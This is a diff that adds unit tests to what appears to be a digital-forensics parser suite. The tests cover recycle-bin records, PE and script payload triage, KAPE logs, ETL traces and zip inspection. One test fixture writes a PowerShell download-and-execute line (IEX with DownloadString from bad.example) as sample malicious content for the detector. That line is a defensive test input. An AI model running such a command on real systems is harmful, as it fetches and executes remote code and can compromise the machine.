@@ -1,6 +1,7 @@
 import os
 import sys
 import sqlite3
+import struct
 import tempfile
 import importlib
 import importlib.util
@@ -22,6 +23,7 @@ browser_module = importlib.import_module('parsers.browser_parsers')
 windows_module = importlib.import_module('parsers.windows_parsers')
 log_module = importlib.import_module('parsers.log_parsers')
 vendor_module = importlib.import_module('parsers.vendor_parsers')
+kape_gap_module = importlib.import_module('parsers.kape_gap_parsers')
 catalog_module = importlib.import_module('parsers.catalog')
 dissect_module = importlib.import_module('parsers.dissect_parsers')
 
@@ -45,6 +47,15 @@ timezone_module = importlib.util.module_from_spec(timezone_spec)
 sys.modules['utils.timezone'] = timezone_module
 timezone_spec.loader.exec_module(timezone_module)
 utils_package.timezone = timezone_module
+
+archive_extraction_spec = importlib.util.spec_from_file_location(
+    'utils.archive_extraction',
+    os.path.join(os.path.dirname(os.path.dirname(__file__)), 'utils', 'archive_extraction.py'),
+)
+archive_extraction_module = importlib.util.module_from_spec(archive_extraction_spec)
+sys.modules['utils.archive_extraction'] = archive_extraction_module
+archive_extraction_spec.loader.exec_module(archive_extraction_module)
+utils_package.archive_extraction = archive_extraction_module
 
 event_dedup_spec = importlib.util.spec_from_file_location(
     'utils.event_deduplication',
@@ -81,6 +92,10 @@ PaloAltoParser = vendor_module.PaloAltoParser
 PfSenseParser = vendor_module.PfSenseParser
 SonicWallSyslogParser = vendor_module.SonicWallSyslogParser
 VelociraptorParser = vendor_module.VelociraptorParser
+RecycleBinParser = kape_gap_module.RecycleBinParser
+PayloadTriageParser = kape_gap_module.PayloadTriageParser
+KapeLogParser = kape_gap_module.KapeLogParser
+DiagnosticLogParser = kape_gap_module.DiagnosticLogParser
 
 try:
     from dissect.ntfs.c_ntfs import c_ntfs
@@ -1288,6 +1303,129 @@ class ParserHardeningTestCase(unittest.TestCase):
         self.assertEqual(parser.errors, [])
         self.assertEqual(len(parser.warnings), 1)
         self.assertIn('sidecar unavailable', parser.warnings[0].lower())
+
+    def test_recycle_bin_parser_decodes_windows_10_i_record(self):
+        parser = RecycleBinParser(case_id=1)
+        original_path = r'C:\Users\jdube\Downloads\evil.exe'
+        encoded_path = original_path.encode('utf-16-le')
+        deletion_time = datetime(2026, 4, 25, 22, 0, 0)
+        filetime = int((deletion_time - datetime(1601, 1, 1)).total_seconds() * 10000000)
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            recycle_dir = os.path.join(tmpdir, 'C', '$Recycle.Bin', 'S-1-5-21-1')
+            os.makedirs(recycle_dir, exist_ok=True)
+            file_path = os.path.join(recycle_dir, '$IABC123.exe')
+            companion_path = os.path.join(recycle_dir, '$RABC123.exe')
+            with open(file_path, 'wb') as handle:
+                handle.write(struct.pack('<QQQI', 2, 12345, filetime, len(encoded_path)))
+                handle.write(encoded_path)
+            with open(companion_path, 'wb') as handle:
+                handle.write(b'MZ')
+
+            events = list(parser.parse(file_path))
+
+        self.assertEqual(len(events), 1)
+        self.assertEqual(events[0].artifact_type, 'recycle_bin')
+        self.assertEqual(events[0].target_path, original_path)
+        self.assertEqual(events[0].file_size, 12345)
+        extra = json.loads(events[0].extra_fields)
+        self.assertTrue(extra['companion_exists'])
+        self.assertEqual(extra['recycle_sid'], 'S-1-5-21-1')
+
+    def test_payload_triage_parser_hashes_pe_and_finds_script_indicators(self):
+        pe_parser = PayloadTriageParser(case_id=1)
+        script_parser = PayloadTriageParser(case_id=1)
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            pe_path = os.path.join(tmpdir, 'evil.exe')
+            pe_data = bytearray(512)
+            pe_data[0:2] = b'MZ'
+            struct.pack_into('<I', pe_data, 0x3C, 0x80)
+            pe_data[0x80:0x84] = b'PE\x00\x00'
+            struct.pack_into('<HHI', pe_data, 0x84, 0x8664, 3, 1710000000)
+            with open(pe_path, 'wb') as handle:
+                handle.write(pe_data)
+
+            script_path = os.path.join(tmpdir, 'payload.ps1')
+            with open(script_path, 'w', encoding='utf-8') as handle:
+                handle.write("IEX(New-Object Net.WebClient).DownloadString('http://bad.example/a.ps1')")
+
+            pe_events = list(pe_parser.parse(pe_path))
+            script_events = list(script_parser.parse(script_path))
+
+        self.assertEqual(pe_events[0].artifact_type, 'file_triage')
+        self.assertTrue(json.loads(pe_events[0].raw_json)['pe_header_found'])
+        self.assertEqual(len(pe_events[0].file_hash_sha256), 64)
+        self.assertIn('downloadstring', script_events[0].search_blob.lower())
+        self.assertIn('http://bad.example/a.ps1', script_events[0].search_blob)
+
+    def test_kape_gap_parsers_are_registered_and_cataloged(self):
+        registry = ParserRegistry()
+        registered = registry.list_parsers()
+
+        for parser_key in [
+            'recycle_bin', 'file_triage', 'kape_log', 'office_autosave',
+            'windows_search_db', 'diagnostic_log', 'ntfs_metadata',
+        ]:
+            self.assertIn(parser_key, registered)
+            self.assertIn(parser_key, catalog_module.PARSER_CAPABILITIES_BY_KEY)
+
+        self.assertIn('recycle_bin', catalog_module.HUNTING_TAB_TYPES['filesystem'])
+        self.assertIn('file_triage', catalog_module.HUNTING_TAB_TYPES['filesystem'])
+        self.assertIn('etl_trace', catalog_module.HUNTING_TAB_TYPES['events'])
+
+    def test_registry_prefers_kape_log_over_generic_csv(self):
+        registry = ParserRegistry()
+
+        with tempfile.NamedTemporaryFile('w', suffix='_CopyLog.csv', delete=False, encoding='utf-8') as handle:
+            handle.write('Timestamp,Source,Destination\n2026-04-25T22:00:00Z,C:\\a,C:\\b\n')
+            file_path = handle.name
+        try:
+            artifact_type, parser = registry.resolve_parser_for_file(file_path=file_path, case_id=1)
+        finally:
+            os.remove(file_path)
+
+        self.assertEqual(artifact_type, 'kape_log')
+        self.assertIsInstance(parser, KapeLogParser)
+
+    def test_diagnostic_log_parser_emits_etl_trace_type(self):
+        parser = DiagnosticLogParser(case_id=1)
+
+        with tempfile.NamedTemporaryFile('wb', suffix='.etl', delete=False) as handle:
+            handle.write(b'ETLTRACE')
+            file_path = handle.name
+        try:
+            events = list(parser.parse(file_path))
+        finally:
+            os.remove(file_path)
+
+        self.assertEqual(len(events), 1)
+        self.assertEqual(events[0].artifact_type, 'etl_trace')
+
+    def test_zip_inspection_routes_deflate64_to_external_extractor(self):
+        archive_extraction = importlib.import_module('utils.archive_extraction')
+
+        class _FakeMember:
+            filename = 'C/$MFT'
+            compress_type = 9
+
+        class _FakeZip:
+            def __enter__(self):
+                return self
+
+            def __exit__(self, exc_type, exc, tb):
+                return False
+
+            def infolist(self):
+                return [_FakeMember()]
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            with patch.object(archive_extraction.zipfile, 'ZipFile', return_value=_FakeZip()):
+                inspection = archive_extraction.inspect_zip_archive('/tmp/kape.zip', tmpdir)
+
+        self.assertTrue(inspection['requires_external_extractor'])
+        self.assertEqual(inspection['unsupported_methods'], [9])
+        self.assertEqual(inspection['unsafe_members'], [])
 
 
 if __name__ == '__main__':
